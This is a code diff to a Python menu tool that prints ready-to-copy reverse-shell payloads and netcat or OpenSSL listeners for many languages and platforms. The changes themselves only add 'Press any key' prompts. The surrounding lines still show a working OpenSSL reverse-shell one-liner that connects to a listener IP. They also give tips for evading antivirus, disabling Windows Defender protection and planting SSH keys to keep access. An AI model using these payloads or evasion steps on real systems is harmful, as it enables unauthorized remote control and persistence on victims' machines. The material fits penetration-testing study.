@@ -67,6 +67,7 @@ def Shells():
         print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp1))
         print("\t NOTE:\t  This consitently works. If there is a command injection on a linux based system, this is my go too.\n \t\t If the connection keeps getting dropped I would recommend adding a public key to the authorized_keys in the .ssh folder of the application's user\n")
         print("\t*******************************************************************\n")
+        input("Press any key to go back to the menu!")
     elif options == "2":
         print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tPerl Linux SHELL\t\t***\n" + m.bcolors.ENDC)
         print("\t*******************************************************************")
@@ -77,6 +78,7 @@ def Shells():
         print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp2))
         print("\t NOTE:\t  This  works fine. However, I would use python if that is avalible to you\n")
         print("\t*******************************************************************\n")
+        input("Press any key to go back to the menu!")
     elif options == "3":
         print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tPerl Windows SHELL\t\t***\n" + m.bcolors.ENDC)
         print("\t*******************************************************************\n")
@@ -86,6 +88,7 @@ def Shells():
         print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp3))
         print("\t NOTE:\t  I would only use this on older boxes that do not have any other execution paths\n")
         print("\t*******************************************************************\n")
+        input("Press any key to go back to the menu!")
     elif options == "4":
         print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tPowerShell Reverse  SHELL\t\t***\n" + m.bcolors.ENDC)
         print("\t*******************************************************************\n")
@@ -103,6 +106,7 @@ def Shells():
         print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp4))
         print("\t NOTE:\t In newer versions of PowerShell AMSI will prevent this script from running. You will have to do one of two things: \n \t\t 1. If administrator disable it, with 'Set-MpPreference -DisableIOAVProtection $True' \n\t\t 2. Run the script in  verions 1 or 2 with the -v 1 or -v 2. .NET v2.0.50727 is required\n")
         print("\t*******************************************************************\n")
+        input("Press any key to go back to the menu!")
     elif options == "5":
         print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tPython Linux Reverse  SHELL\t\t***\n" + m.bcolors.ENDC)
         print("\t*******************************************************************\n")
@@ -112,6 +116,7 @@ def Shells():
         print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp5))
         print("\t NOTE:\t  This is a go to shell if python is avalible\n")
         print("\t*******************************************************************\n")
+        input("Press any key to go back to the menu!")
     elif options == "6":
         print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tPython Windows Reverse SHELL\t\t***\n" + m.bcolors.ENDC)
         print("\t*******************************************************************\n")
@@ -120,6 +125,7 @@ def Shells():
         print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp6))
         print("\t NOTE:\t This shell works both on Python3 and Python2. You will need to make sure that python is installed. Since python will not trip an AV\n\t (Only applicaton whitelisting will pervent) this is a great method to establish a shell when other things are being monitored.\n")
         print("\t*******************************************************************\n")
+        input("Press any key to go back to the menu!")
     elif options == "7":
         print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tPHP SHELL\t\t***\n" + m.bcolors.ENDC)
         print("\t*******************************************************************\n")
@@ -130,6 +136,7 @@ def Shells():
         print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp7))
         print("\t NOTE:\t This shell should be used if there is LFI or a place within a PHP application where you can create a file within the web root.\n")
         print("\t*******************************************************************\n")
+        input("Press any key to go back to the menu!")
     elif options == "8":
         print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tRuby Linux SHELL\t\t***\n" + m.bcolors.ENDC)
         print("\t*******************************************************************\n")
@@ -139,6 +146,7 @@ def Shells():
         print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp8))
         print("\t NOTE:\t This shell works fine. However, python is normally a better choice.\n")
         print("\t*******************************************************************\n")
+        input("Press any key to go back to the menu!")
     elif options == "9":
         print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tRuby Windows SHELL\t\t***\n" + m.bcolors.ENDC)
         print("\t*******************************************************************\n")
@@ -148,6 +156,7 @@ def Shells():
         print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp9))
         print("\t NOTE:\t This shell whould require ruby to be installed on the Windows box.\n")
         print("\t*******************************************************************\n")
+        input("Press any key to go back to the menu!")
     elif options == "10":
         print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tGoLang Reverse  SHELL\t\t***\n" + m.bcolors.ENDC)
         print("\t*******************************************************************\n")
@@ -156,6 +165,7 @@ def Shells():
         print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp10))
         print("\t NOTE:\t This shell would only be used if nothing else is avaible and GoLang is.\n")
         print("\t*******************************************************************\n")
+        input("Press any key to go back to the menu!")
     elif options == "11":
         print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tAwk Reverse  SHELL\t\t***\n" + m.bcolors.ENDC)
         print("\t*******************************************************************\n")
@@ -164,6 +174,7 @@ def Shells():
         print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp11))
         print("\t NOTE:\t This shell would work great when you are on a linux box and the normal shell paths are blocked.\n")
         print("\t*******************************************************************\n")
+        input("Press any key to go back to the menu!")
     elif options == "12":
         print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tJava Linux Reverse  SHELL\t\t***\n" + m.bcolors.ENDC)
         print("\t*******************************************************************\n")
@@ -178,6 +189,7 @@ def Shells():
         print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp12))
         print("\t NOTE:\t Use this shell when you have access to a Java based web application and the OS in use is Linux. Things like Jinkens, etc..\n")
         print("\t*******************************************************************\n")
+        input("Press any key to go back to the menu!")
     elif options == "13":
         print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tJava Windows Reverse  SHELL\t\t***\n" + m.bcolors.ENDC)
         print("\t*******************************************************************\n")
@@ -200,6 +212,7 @@ String cmd="cmd.exe";
         print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp13))
         print("\t NOTE:\t Use this shell when you have access to a Java based web application and the OS in use is Windows. Things like Jinkens, etc..\n")
         print("\t*******************************************************************\n")
+        input("Press any key to go back to the menu!")
     elif options == "14":
         print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tOpenSSL Reverse  SHELL\t\t***\n" + m.bcolors.ENDC)
         print("\t*******************************************************************\n")
@@ -209,13 +222,17 @@ String cmd="cmd.exe";
         print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy payload: " + m.bcolors.ENDC + """
 mkfifo /tmp/{2}; /bin/sh -i < /tmp/{2} 2>&1 | openssl s_client -quiet -connect {0}:{1} > /tmp/{2}; rm /tmp/{2}
 """.format(m.listener_ip, rp14, fName))
-        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tJava Linux Listener\t\t***\n" + m.bcolors.ENDC)
+        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tOpenSSL Listener\t\t***\n" + m.bcolors.ENDC)
         print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy listener: " + m.bcolors.ENDC + """
+---Generate the certificates--- (Copy this first!)
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+
+---Start the listener--- (Copy this second!)
 openssl s_server -quiet -key key.pem -cert cert.pem -port %s
 """ %(rp14))
         print("\t NOTE:\t This is a really cool shell method. It works great.\n")
         print("\t*******************************************************************\n")
+        input("Press any key to go back to the menu!")
     elif options == "15":
         print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tNetCat Mac SHELL\t\t***\n" + m.bcolors.ENDC)
         print("\t*******************************************************************")
@@ -225,7 +242,7 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port %s
         print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp15))
         print("\t NOTE:\t  This  works Great. NC is installed on MAC by default, however it does not support the -e flag so you have to use a fifo pipe file.\n")
         print("\t*******************************************************************\n")
-
+        input("Press any key to go back to the menu!")
     elif options == "99":
         os.system("clear")
         break
